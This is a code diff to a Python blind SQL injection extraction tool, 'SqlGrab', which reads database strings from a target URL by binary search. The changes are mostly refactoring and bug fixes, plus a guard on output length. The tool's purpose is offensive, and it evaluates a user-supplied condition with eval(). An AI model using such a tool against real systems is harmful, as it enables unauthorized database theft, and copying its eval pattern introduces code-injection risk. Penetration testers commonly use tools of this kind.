@@ -25,7 +25,7 @@ class HTTPRequest(BaseHTTPRequestHandler):
 
 
 class SqlGrab:
-    ''' Extracts string data from a conditional SQLi vulnerability using a binary search tree approach. '''
+    ''' Extracts string data from a conditional SQLi vulnerability using a binary search tree approach '''
 
     payloads = {
         'mysql': {
@@ -60,21 +60,18 @@ class SqlGrab:
         self.delay = options.delay
         self.payloads = self.payloads[options.dbms]
         self.condition = options.condition
-        self.session = Session()
-
-        if options.proxy:
-            self.proxy = {
-                'http': options.proxy,
-                'https': options.proxy
-            }
-        else:
-            self.proxy = {}
+        self.proxy = {
+            'http': options.proxy,
+            'https': options.proxy
+        } if options.proxy else {}
 
         try:
             # parse the base request from file
             self.request = self.parseRequest(options.host, options.request)
             print(
                 f'[*] Query: \'{options.query}\'. Inserting payload into {", ".join(self.locations)}.')
+
+            self.session = Session()  # start a session for connection pooling
 
             # get the length of the query output
             length = self.getLength(query=options.query)
@@ -89,12 +86,8 @@ class SqlGrab:
         except KeyboardInterrupt:
             print('\n[!] Interrupted')
 
-    def isMatch(self, response):
-        ''' Takes a conditional statement from command line arguments and determines the truth value of the query based on it. '''
-        return eval(self.condition, locals())
-
     def getValue(self, payload, args, range=(0, math.inf), context={}, status=None):
-        """ Determines the value of a vairable based on iterative halving/doubling of the search space """
+        ''' Determines the value of a vairable based on iterative halving/doubling of the search space '''
         min, max = range
 
         while min != max:
@@ -114,6 +107,10 @@ class SqlGrab:
             if status:
                 print(status.format(context=context, min=min, max=max), end='\r')
 
+            if args['value'] > 2**32:
+                raise RuntimeError(
+                    '[!] An upper bound on the output length could not be found. Maybe a syntax error?')
+
             time.sleep(self.delay)
 
         # sanity check
@@ -124,6 +121,7 @@ class SqlGrab:
         return args['value']
 
     def getLength(self, **args):
+        ''' Determines the length of the query response '''
         return self.getValue(
             self.payloads['length'],
             args=dict(**args, value=self.initialLength),
@@ -151,8 +149,12 @@ class SqlGrab:
 
         return result
 
+    def isMatch(self, response):
+        ''' Takes a conditional statement from command line arguments and determines the truth value of the query based on it. '''
+        return eval(self.condition, locals())
+
     def getMatch(self, payload, args):
-        """Issues a request and determines truth value of query based on the response"""
+        ''' Issues a request and determines truth value of the query based on the response '''
 
         prepared = self.request.prepare()
 
@@ -210,13 +212,13 @@ class SqlGrab:
                 self.locations.append('body')
             for key, value in request.headers._headers:
                 if tag in key:
-                    self.locations.append('{key} header key')
+                    self.locations.append(f'{key} header key')
                 if tag in value:
                     self.locations.append(f'{key} header value')
 
             if not self.locations:
                 raise Exception(
-                    'The parsed request file does not contain a \'{payload}\' tag.')
+                    '[!] The parsed request file does not contain a \'{payload}\' tag. Add the string \'{payload}\' within the request file at the injection point.')
 
             return request
 
@@ -224,7 +226,8 @@ class SqlGrab:
 if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(
-        description='Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.'
+        description='Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.',
+        epilog='Note: the program will assume something is broken if responses indicate the output is larger than 2^32 bytes (~4GB)'
     )
     parser.add_argument('-u', '--host', required=True,
                         help='Host URL, including protocol scheme and optionally port. E.g. https://target.com:80')
